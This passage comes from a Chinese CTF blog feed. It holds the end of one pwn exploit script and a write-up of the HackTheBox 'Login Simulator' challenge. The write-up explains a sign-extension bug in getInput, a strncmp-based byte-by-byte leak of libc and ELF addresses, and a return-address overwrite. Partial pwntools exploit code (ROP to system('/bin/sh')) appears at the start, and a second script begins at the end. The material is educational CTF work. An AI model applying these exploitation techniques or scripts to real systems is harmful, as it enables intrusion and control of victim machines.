class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wtaddr(<span class="number">0x00000000004016e3</span>)</span><br><span class="line">wtaddr(x.dump(<span class="string">'str_bin_sh'</span>))</span><br><span class="line">wtaddr(<span class="number">0x000000000040101a</span>)</span><br><span class="line">wtaddr(x.dump(<span class="string">'system'</span>))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(<span class="string">'BINGAUS'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个比赛很迷惑。感觉大多题很水但是ctftime比重高。这是其中一个有点意思的题</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Login Simulator-pwn-challenge-wp</title>
    <link href="lexsd6.github.io/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/"/>
    <id>lexsd6.github.io/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/</id>
    <published>2022-04-03T13:53:51.338Z</published>
    <updated>2022-04-04T08:30:22.501Z</updated>
    
    <content type="html"><![CDATA[<p>一道意义题，让我学会了很多…比如明白了大佬总再说“F5 只是看乐子，干正事还是得看汇编”<a id="more"></a></p><h2 id="程序流程分析"><a href="#程序流程分析" class="headerlink" title="程序流程分析"></a>程序流程分析</h2><p>题目开了PIE 、canary，NX保护。</p><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledRUNPATH:  b&apos;./glibc&apos;</code></pre><p>程序的mian函数伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+7h] [rbp-A9h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">setup</span>(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)__isoc99_scanf(<span class="string">"%d"</span>, &amp;v6) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Something went wrong.\n"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="keyword">register</span>(&amp;v8);</span><br><span class="line">      <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      v5 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        login((<span class="keyword">const</span> struct utmp *)&amp;v8);</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Good job! :^)"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Invalid username! :)"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"You need to register first."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid option.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的主要逻辑简单，主要是注册（register）、登录（login）及退出（exit）3个功能。</p><p>我们进行跟进注册（register）可以看到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">register</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#123;i&#125; Username length: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)__isoc99_scanf(<span class="string">"%d"</span>, &amp;v2) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v2 &gt; <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)v2 &lt;= <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"&#123;i&#125; Enter username: "</span>, &amp;v2);</span><br><span class="line">      getInput(a1, v2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Username registered successfully!"</span>);</span><br><span class="line">      result = v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid length."</span>);</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something went wrong!"</span>);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然，函数对我们输入的数据有合法的限制，但检测的是我们输入的数据长度。导致我们输入的数据可以小于我们原本设置的输入数据大小。</p><p>于是跟进到login函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">(<span class="keyword">const</span> struct utmp *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#123;i&#125; Username: "</span>);</span><br><span class="line">  getInput(&amp;s1, v1);</span><br><span class="line">  <span class="built_in">strncmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)entry, (<span class="keyword">signed</span> <span class="keyword">int</span>)v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在login函数的检测中，v1是由我们输入的“数据长度”。但我们实际的输入数据没那么多，导致可能我们泄露栈上数据。</p><h2 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h2><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>我们分析getInput函数，getinput的作用是将数据一个一个字符写入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">getInput</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="keyword">char</span> i; <span class="comment">// [rsp+17h] [rbp-9h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 &gt; i &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &gt; <span class="number">0</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf != <span class="number">0x20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf == <span class="number">0xA</span> )</span><br><span class="line">        <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们乍看，可以没用什么问题。用于输入的第二参数在调用前就被我们严格的限制。</p><p>但是在对字符串处理时，对0x20对应的字符’ ‘(空格)执行跳过，导致栈上原本存放的数据继续保留下来。</p><p>再加上之前，login的验证功能，导致我们可以一个个把部分栈上数据泄露出来。</p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>再回到getInput函数，看反汇编代码看不出毛病，但是审计汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">0x00005630ed0c92fd &lt;+0&gt;:     push   rbp</span><br><span class="line"> 0x00005630ed0c92fe &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line"> 0x00005630ed0c9301 &lt;+4&gt;:     sub    rsp,0x20</span><br><span class="line"> 0x00005630ed0c9305 &lt;+8&gt;:     mov    QWORD PTR [rbp-0x18],rdi</span><br><span class="line"> 0x00005630ed0c9309 &lt;+12&gt;:    mov    DWORD PTR [rbp-0x1c],esi</span><br><span class="line"> 0x00005630ed0c930c &lt;+15&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line"> 0x00005630ed0c9315 &lt;+24&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line"> 0x00005630ed0c9319 &lt;+28&gt;:    xor    eax,eax</span><br><span class="line"> 0x00005630ed0c931b &lt;+30&gt;:    mov    BYTE PTR [rbp-0x9],0x0</span><br><span class="line"> 0x00005630ed0c931f &lt;+34&gt;:    jmp    0x5630ed0c936f &lt;getInput+114&gt;</span><br><span class="line"> 0x00005630ed0c9321 &lt;+36&gt;:    lea    rax,[rbp-0xa]</span><br><span class="line"> 0x00005630ed0c9325 &lt;+40&gt;:    mov    edx,0x1</span><br><span class="line"> 0x00005630ed0c932a &lt;+45&gt;:    mov    rsi,rax</span><br><span class="line"> 0x00005630ed0c932d &lt;+48&gt;:    mov    edi,0x0</span><br><span class="line"> 0x00005630ed0c9332 &lt;+53&gt;:    mov    eax,0x0</span><br><span class="line"> 0x00005630ed0c9337 &lt;+58&gt;:    call   0x5630ed0c9070 &lt;read@plt&gt;</span><br><span class="line"> 0x00005630ed0c933c &lt;+63&gt;:    test   eax,eax</span><br><span class="line"> 0x00005630ed0c933e &lt;+65&gt;:    jle    0x5630ed0c937a &lt;getInput+125&gt;</span><br><span class="line"> 0x00005630ed0c9340 &lt;+67&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line"> 0x00005630ed0c9344 &lt;+71&gt;:    cmp    al,0x20</span><br><span class="line"> 0x00005630ed0c9346 &lt;+73&gt;:    je     0x5630ed0c9364 &lt;getInput+103&gt;</span><br><span class="line"> 0x00005630ed0c9348 &lt;+75&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line"> 0x00005630ed0c934c &lt;+79&gt;:    cmp    al,0xa</span><br><span class="line"> 0x00005630ed0c934e &lt;+81&gt;:    je     0x5630ed0c937d &lt;getInput+128&gt;</span><br><span class="line"> 0x00005630ed0c9350 &lt;+83&gt;:    movsx  rdx,BYTE PTR [rbp-0x9]</span><br><span class="line"> 0x00005630ed0c9355 &lt;+88&gt;:    mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line"> 0x00005630ed0c9359 &lt;+92&gt;:    add    rdx,rax</span><br><span class="line"> 0x00005630ed0c935c &lt;+95&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line"> 0x00005630ed0c9360 &lt;+99&gt;:    mov    BYTE PTR [rdx],al</span><br><span class="line"> 0x00005630ed0c9362 &lt;+101&gt;:   jmp    0x5630ed0c9365 &lt;getInput+104&gt;</span><br><span class="line"> 0x00005630ed0c9364 &lt;+103&gt;:   nop</span><br><span class="line"> 0x00005630ed0c9365 &lt;+104&gt;:   movzx  eax,BYTE PTR [rbp-0x9]</span><br><span class="line"> 0x00005630ed0c9369 &lt;+108&gt;:   add    eax,0x1</span><br><span class="line"> 0x00005630ed0c936c &lt;+111&gt;:   mov    BYTE PTR [rbp-0x9],al</span><br><span class="line"> 0x00005630ed0c936f &lt;+114&gt;:   movsx  eax,BYTE PTR [rbp-0x9]</span><br><span class="line"> 0x00005630ed0c9373 &lt;+118&gt;:   cmp    DWORD PTR [rbp-0x1c],eax</span><br><span class="line"> 0x00005630ed0c9376 &lt;+121&gt;:   jg     0x5630ed0c9321 &lt;getInput+36&gt;</span><br><span class="line"> 0x00005630ed0c9378 &lt;+123&gt;:   jmp    0x5630ed0c937e &lt;getInput+129&gt;</span><br><span class="line"> 0x00005630ed0c937a &lt;+125&gt;:   nop</span><br><span class="line"> 0x00005630ed0c937b &lt;+126&gt;:   jmp    0x5630ed0c937e &lt;getInput+129&gt;</span><br><span class="line"> 0x00005630ed0c937d &lt;+128&gt;:   nop</span><br><span class="line"> 0x00005630ed0c937e &lt;+129&gt;:   nop</span><br><span class="line"> 0x00005630ed0c937f &lt;+130&gt;:   mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line"> 0x00005630ed0c9383 &lt;+134&gt;:   sub    rax,QWORD PTR fs:0x28</span><br><span class="line"> 0x00005630ed0c938c &lt;+143&gt;:   je     0x5630ed0c9393 &lt;getInput+150&gt;</span><br><span class="line"> 0x00005630ed0c938e &lt;+145&gt;:   call   0x5630ed0c9050 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 0x00005630ed0c9393 &lt;+150&gt;:   leave</span><br><span class="line"> 0x00005630ed0c9394 &lt;+151&gt;:   ret</span><br></pre></td></tr></table></figure><p>重点是这一个部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x00005630ed0c9350 &lt;+83&gt;:    movsx  rdx,BYTE PTR [rbp-0x9]</span><br><span class="line">0x00005630ed0c9355 &lt;+88&gt;:    mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">0x00005630ed0c9359 &lt;+92&gt;:    add    rdx,rax</span><br><span class="line">0x00005630ed0c935c &lt;+95&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line">0x00005630ed0c9360 &lt;+99&gt;:    mov    BYTE PTR [rdx],al</span><br></pre></td></tr></table></figure><p>这段的本意是，完成反汇编代码<code>*(_BYTE *)(a1 + i) = buf;</code>的作用，即，将一个字符放该存放它的地方，形成字符串。</p><p>但是由于使用了<code>movsx</code> 和<code>movzx</code>两个指令，这两指令都是<a href="https://baike.baidu.com/item/数据传送/500685" target="_blank" rel="noopener">数据传送</a>指令MOV的变体。<code>movsx</code>是带符号扩展，并传送。<code>movzx</code>是无符号扩展，并传送.因此在处理一些数据时，会有不同的表现。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV BL,80H</span><br><span class="line">MOVSX AX,BL</span><br><span class="line"></span><br><span class="line">mov BL, 80H</span><br><span class="line">MOVZX AX, BL</span><br></pre></td></tr></table></figure><p>运行完以上MOVSX指令语句之后，AX的值为FF80H。由于BL为80H=1000 0000，最高位也即符号位为1，在进行带符号扩展时，其扩展的高8位均为1，故赋值AX为1111 1111 1000 0000，即AX=FF80H。而在运行完以上MOVZX指令语句之后，AX的值为0080H。由于BL为80H，最高位也即符号位为1，但在进行无符号扩展时，其扩展的高8位均为0，故赋值AX为0080H。</p><p>这特性导致，若在题目中中[rbp-0x9]中为0x80时， <code>movsx  eax,BYTE PTR [rbp-0x9]</code>执行后，eax值是<code>0xffffffffffffff80</code>而非<code>0x80</code>.导致在执行<code>add    rdx,rax</code>时rdx相加的不是0x80而是<code>0xffffffffffffff80</code>.导致在<code>rbx+0xffffffffffffff80</code>写入了数据。</p><p>同理，在判断循环（<code>for ( i = 0; a2 &gt; i &amp;&amp; (signed int)read(0, &amp;buf, 1uLL) &gt; 0; ++i )</code>）是否结束是也用了<code>movsx</code>指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00005630ed0c9369 &lt;+108&gt;:   add    eax,0x1</span><br><span class="line">0x00005630ed0c936c &lt;+111&gt;:   mov    BYTE PTR [rbp-0x9],al</span><br><span class="line">0x00005630ed0c936f &lt;+114&gt;:   movsx  eax,BYTE PTR [rbp-0x9]</span><br><span class="line">0x00005630ed0c9373 &lt;+118&gt;:   cmp    DWORD PTR [rbp-0x1c],eax</span><br></pre></td></tr></table></figure><p>由于是带符号比较，<code>0x80</code>(正数)是肯定大于<code>0xffffffffffffff80</code>(负数)。<strong>导致我们可以在输入0x80个字符后，继续写入字符。</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="leak-addr"><a href="#leak-addr" class="headerlink" title="leak addr"></a>leak addr</h3><p>通过gdb我们可以发现，在login函数栈上残留了<code>_IO_2_1_stdout_</code>的数据和一个ELF段的地址。<img src="image-20220404112731311.png" alt="image-20220404112731311"></p><p>我们可以利用在register写入猜测的地址数据和数据长度，即构造恶意数据长度为已知道的数据+一位猜测数据，通过login来一个个检验我们猜测是否准确。这样通过strncmp检测，若我们猜测数据对了则显示login成功，未猜对就显示失败。</p><p>这样我们慢慢leak出<code>_IO_2_1_stdout_</code>的地址，由<code>_IO_2_1_stdout_</code>是glib上的函数，我们间接得到了libc的base addr和 system等libc函数的地址和one_getgad的地址。</p><p>我们通过一个ELF段的地址上的地址，从而间接得到程序ELF段的基础地址，从而推测出bss段或某一个可写地址的大概位置。</p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>之前我们知道getInput，有溢出的可能。经过gdb发现。getInput+<code>0xffffffffffffff80</code>的位置恰好，离rbp和返回地址很近。</p><p><img src="image-20220404152704003.png" alt="image-20220404152704003"></p><p>同时在getinput中我们的空格会保留栈上原本的数据。这样我们可以通过一定空格来到rbp和返回地址附近。从而，复写返回地址劫持rip，控制程序流。</p><h2 id="exp-local"><a href="#exp-local" class="headerlink" title="exp_local"></a>exp_local</h2><p>因此流程下来的exp，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/14 09:59:41</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#from libcfind import *</span></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./loginsim'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#context.arch=e.arch</span></span><br><span class="line">ip_port=[<span class="string">'167.99.205.117'</span>,<span class="number">30301</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(mun,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username 